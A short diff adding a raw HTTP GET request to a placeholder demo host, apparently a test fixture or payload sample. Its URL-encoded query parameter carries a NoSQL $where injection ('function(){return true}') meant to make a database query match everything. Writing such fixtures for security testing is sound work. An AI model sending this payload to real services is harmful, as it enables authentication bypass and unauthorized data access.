@@ -1,0 +1,4 @@
+GET /a?id=user%5B%24where%5D%3Dfunction%28%29%7Breturn%2Btrue%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
